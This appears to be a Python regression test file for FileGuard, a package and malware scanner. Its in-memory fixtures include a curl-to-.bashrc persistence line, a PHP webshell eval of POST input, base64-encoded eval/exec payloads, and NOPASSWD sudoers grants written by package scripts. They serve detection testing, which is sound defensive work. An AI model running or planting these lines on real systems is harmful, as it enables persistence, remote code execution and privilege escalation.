"""Regression tests for FileGuard 0.5.6: duplicate evidence, encoded eval payloads, Debian sudoers context.
All fixtures are inert text built in memory; nothing is executed."""
import io
import os
import sys
import tarfile
import tempfile
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
from test_regressions_055 import BACKEND, _ar, _tar_gz  # noqa: E402,F401  (sets FILEGUARD_HOME / sys.path)

from fileguard import installers, unpack  # noqa: E402
from fileguard.analyzers import Analyzer  # noqa: E402
from fileguard.model import ScanContext  # noqa: E402

DEBIAN_SUDOERS = b"""#
# This file MUST be edited with the 'visudo' command as root.
Defaults\tenv_reset
Defaults\tmail_badpass
Defaults\tsecure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
Defaults\tuse_pty
# User privilege specification
root\tALL=(ALL:ALL) ALL
# Allow members of group sudo to execute any command
%sudo\tALL=(ALL:ALL) ALL
@includedir /etc/sudoers.d
"""
EVIL_SUDOERS = b"ALL ALL=(ALL) NOPASSWD: ALL\n"


def _deb(package, data_files, postinst=b"#!/bin/sh\nexit 0\n", setuid=()):
    control = _tar_gz({"./control": f"Package: {package}\nVersion: 1\n".encode(), "./postinst": postinst})
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data in data_files.items():
            ti = tarfile.TarInfo(name)
            ti.size = len(data)
            ti.mode = 0o4755 if name in setuid else 0o644
            tf.addfile(ti, io.BytesIO(data))
    return _ar([("debian-binary", b"2.0\n"), ("control.tar.gz", control), ("data.tar.gz", buf.getvalue())])


def _scan_deb(blob, name="t.deb"):
    """Unpack + analyze like the pipeline's S3 (without ClamAV / YARA / deps)."""
    d = Path(tempfile.mkdtemp(prefix="fg-test-"))
    (d / name).write_bytes(blob)
    ctx = ScanContext("t")
    unp = unpack.Unpacker(ctx, d / "out")
    inv = unp.run(str(d / name), name)
    an = Analyzer(ctx, lambda *a: [])
    an.deb_payload = unp.in_deb_payload
    for item in inv:
        an.analyze(item)
    an.finalize(None)
    return ctx


def _codes(ctx, sev=None):
    return [f.code for f in ctx.findings if sev is None or f.severity == sev]


class DuplicateEvidence(unittest.TestCase):
    def test_overlapping_yara_matches_are_one_finding(self):
        try:
            import yara  # noqa: F401
        except ImportError:
            self.skipTest("yara-python not installed")
        from fileguard import scanners
        p = Path(tempfile.mkdtemp()) / "x.sh"
        p.write_bytes(b"#!/bin/sh\nexit 0\necho 'curl -s http://198.51.100.109/p >/dev/null' >> ~/.bashrc\n")
        hits = [h for h in scanners.yara_scan(str(p), "x.sh") if h["rule"] == "FG_Persistence_Mechanisms"]
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0]["instances"], [">> ~/.bashrc"])

    def test_two_separate_lines_stay_two(self):
        try:
            import yara  # noqa: F401
        except ImportError:
            self.skipTest("yara-python not installed")
        from fileguard import scanners
        p = Path(tempfile.mkdtemp()) / "u.php"
        p.write_bytes(b"<?php\nexit;\nassert($_COOKIE['k']);\neval($_POST['c']);\n")
        hits = [h for h in scanners.yara_scan(str(p), "u.php") if h["rule"] == "FG_Webshell_PHP"]
        self.assertEqual(len(hits[0]["instances"]), 2)

    def test_context_add_merges_contained_evidence(self):
        ctx = ScanContext("t")
        ctx.add("low", "S3", "YARA:X", "z", "e", "a.sh", ">> ~/.bashrc")
        ctx.add("medium", "S3", "YARA:X", "z", "e", "a.sh", "> ~/.bashrc")
        ctx.add("low", "S3", "YARA:X", "z", "e", "b.sh", "> ~/.bashrc")
        self.assertEqual(len(ctx.findings), 2)
        self.assertEqual(ctx.findings[0].severity, "medium")


class EncodedEvalPayload(unittest.TestCase):
    def _text(self, name, data):
        p = Path(tempfile.mkdtemp()) / name
        p.write_bytes(data)
        ctx = ScanContext("t")
        an = Analyzer(ctx, lambda *a: [])
        an._text(str(p), name, name, name.rsplit(".", 1)[-1])
        return ctx

    def test_eval_atob_literal_is_high(self):
        ctx = self._text("a.js", b"function f(){ return; eval(atob('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5j')); }\n")
        self.assertIn("OBFUSCATED_EVAL_PAYLOAD", _codes(ctx, "high"))

    def test_python_exec_b64decode_is_high(self):
        ctx = self._text("a.py", b"import base64\nif False:\n    exec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgnZWNobyBpbmVydCcp'))\n")
        self.assertIn("OBFUSCATED_EVAL_PAYLOAD", _codes(ctx, "high"))

    def test_minified_library_idioms_not_flagged(self):
        js = (b'var root=Function("return this")();var g=new Function("a","return a");'
              b'eval(code);var s=String.fromCharCode(65,66);var d=atob(input);Buffer.from(x,"base64");'
              b'setTimeout(function(){},0);exec(cmd);')
        ctx = self._text("lib.min.js", js)
        self.assertNotIn("OBFUSCATED_EVAL_PAYLOAD", _codes(ctx))


class DebianSudoersContext(unittest.TestCase):
    def test_debian_sudo_package_is_not_high(self):
        ctx = _scan_deb(_deb("sudo", {"./etc/sudoers": DEBIAN_SUDOERS, "./etc/sudoers.d/README": b"# drop-ins here\n",
                                      "./usr/bin/sudo": b"\x7fELF fake LD_PRELOAD"}, setuid=("./usr/bin/sudo",)), "sudo.deb")
        self.assertEqual([f for f in ctx.findings if f.severity in ("high", "critical")], [])
        self.assertIn("SUDOERS_SHIPPED_BY_OWNER", _codes(ctx, "info"))
        self.assertIn("ARCHIVE_SETUID", _codes(ctx, "low"))

    def test_nopasswd_dropin_from_sudo_package_is_high(self):
        ctx = _scan_deb(_deb("sudo", {"./etc/sudoers": DEBIAN_SUDOERS, "./etc/sudoers.d/zz": EVIL_SUDOERS}), "sudo.deb")
        self.assertIn("SUDOERS_GRANT", _codes(ctx, "high"))

    def test_other_package_granting_nopasswd_is_high(self):
        ctx = _scan_deb(_deb("fg-helper", {"./etc/sudoers.d/fg-helper": b"fguser ALL=(root) NOPASSWD: /usr/bin/apt\n"}))
        self.assertIn("SUDOERS_GRANT", _codes(ctx, "high"))

    def test_other_package_full_all_grant_is_high(self):
        ctx = _scan_deb(_deb("fg-helper", {"./etc/sudoers.d/fg": b"fguser ALL=(ALL:ALL) ALL\n"}))
        self.assertIn("SUDOERS_GRANT", _codes(ctx, "high"))

    def test_other_package_limited_rule_is_medium(self):
        ctx = _scan_deb(_deb("fg-helper", {"./etc/sudoers.d/fg": b"Cmnd_Alias FG = /usr/bin/fg-status\n%fg ALL = FG\n"}))
        self.assertIn("SUDOERS_SHIPPED", _codes(ctx, "medium"))

    def test_maintainer_script_writing_sudoers_stays_high(self):
        post = b"#!/bin/sh\nexit 0\necho 'ALL ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/zz\n"
        ctx = _scan_deb(_deb("sudo", {"./etc/sudoers": DEBIAN_SUDOERS}, postinst=post), "sudo.deb")
        self.assertIn("PERSISTENCE_OR_MASQUERADE", _codes(ctx, "high"))

    def test_payload_script_writing_sudoers_stays_high(self):
        ctx = _scan_deb(_deb("fg-x", {"./usr/sbin/fg-setup": b"#!/bin/sh\necho 'x ALL=(ALL) ALL' >> /etc/sudoers\n"}))
        self.assertIn("PERSISTENCE_OR_MASQUERADE", _codes(ctx, "high"))

    def test_setuid_outside_deb_stays_medium(self):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tf:
            ti = tarfile.TarInfo("bin/x")
            ti.size, ti.mode = 1, 0o4755
            tf.addfile(ti, io.BytesIO(b"x"))
        d = Path(tempfile.mkdtemp())
        (d / "a.tgz").write_bytes(buf.getvalue())
        ctx = ScanContext("t")
        unpack.Unpacker(ctx, d / "o").run(str(d / "a.tgz"), "a.tgz")
        self.assertIn("ARCHIVE_SETUID", _codes(ctx, "medium"))


class ElfPreload(unittest.TestCase):
    def _elf(self, data):
        p = Path(tempfile.mkdtemp()) / "b"
        p.write_bytes(b"\x7fELF" + data)
        ctx = ScanContext("t")
        Analyzer(ctx, lambda *a: [])._elf(str(p), "b")
        return ctx

    def test_ld_so_preload_is_medium(self):
        self.assertIn("ELF_PRELOAD", _codes(self._elf(b"..../etc/ld.so.preload...."), "medium"))

    def test_bare_ld_preload_is_low(self):
        self.assertIn("ELF_PRELOAD", _codes(self._elf(b"....LD_PRELOAD...."), "low"))


class DocContextThroughGzip(unittest.TestCase):
    def test_inner_path_keeps_directory_of_gz_stream(self):
        from fileguard.pipeline import _inner_path
        self.assertEqual(_inner_path("s.deb!/data.tar.xz!/./usr/share/doc/sudo/changelog.gz!/changelog"),
                         "./usr/share/doc/sudo/changelog")
        self.assertEqual(_inner_path("a.tgz!/package/index.js"), "package/index.js")
        self.assertEqual(_inner_path("x.tar.gz!/x.tar!/src/run.sh"), "src/run.sh")


class DemoAndExamples(unittest.TestCase):
    def test_examples_bundled_and_inert_copies_of_test_samples(self):
        import hashlib
        from fileguard import cli
        ex = BACKEND / "examples"
        samples = BACKEND.parent / "tests" / "samples" / "20261115-0558"
        for name in cli.DEMOS.values():
            self.assertTrue((ex / name).is_file(), name)
            if samples.is_dir():
                hits = [p for p in samples.rglob(name)]
                self.assertEqual(len(hits), 1)
                self.assertEqual(hashlib.sha256((ex / name).read_bytes()).hexdigest(),
                                 hashlib.sha256(hits[0].read_bytes()).hexdigest())
        self.assertNotEqual(Path(cli.DEMOS[1]).suffix, Path(cli.DEMOS[2]).suffix)

    def test_examples_command_lists_four_labelled_examples(self):
        import contextlib
        import json
        from fileguard import cli
        for lang in ("zh", "en"):
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                cli.cmd_examples(lang)
            out = json.loads(buf.getvalue())
            self.assertEqual([e["kind"] for e in out["examples"]], ["demo_sample", "demo_sample", "package", "url"])
            self.assertTrue(all(e["command"].startswith("fg ") for e in out["examples"]))
            self.assertTrue(all("--example" in e["command"] for e in out["examples"][2:]))
            self.assertTrue(out["question"] and out["decline_option"])

    def test_summary_and_html_marked_as_example(self):
        from fileguard import report
        rep = {"scan_id": "fg_t", "status": "done", "verdict": "BLOCK", "risk_level": "CRITICAL", "file_name": "uuidd-2.11.16.tgz",
               "evidence": [], "missing_checks": [], "special_checks": [], "demo": True, "demo_kind": "sample"}
        sm = report.build_summary(rep, "zh")
        self.assertTrue(sm["demo"])
        self.assertIn("示例测试", sm["demo_label"])
        self.assertIn("Example test", report.build_summary(dict(rep, demo_kind="public"), "en")["demo_label"])
        self.assertIsNone(report.build_summary(dict(rep, demo=False), "zh")["demo_label"])

    def test_installer_ships_every_runtime_dir(self):
        import re
        sh = (BACKEND / "install.sh").read_text()
        managed = set(re.search(r"MANAGED=\(([^)]*)\)", sh, re.S).group(1).split())
        for d in sorted(p.name for p in BACKEND.iterdir() if p.is_dir() and p.name not in ("data", "run", "dist", "vendor") and not p.name.startswith((".", "__"))):
            self.assertIn(d, managed, f"backend/{d}/ is in the release but install.sh would not install it")

    def test_examples_skips_missing_bundled_samples(self):
        import contextlib
        import json
        import tempfile
        from fileguard import cli, config
        old = config.BASE_DIR
        with tempfile.TemporaryDirectory() as t:
            config.BASE_DIR = t
            try:
                buf = io.StringIO()
                with contextlib.redirect_stdout(buf):
                    cli.cmd_examples("en")
            finally:
                config.BASE_DIR = old
        self.assertEqual([e["kind"] for e in json.loads(buf.getvalue())["examples"]], ["package", "url"])

    def test_guide_documents_demo_and_ready_examples(self):
        from fileguard import guide
        for lang in ("zh", "en"):
            t = guide.text(lang)
            self.assertIn("fg demo 1|2", t)
            self.assertIn("fg examples --lang", t)


if __name__ == "__main__":
    unittest.main()
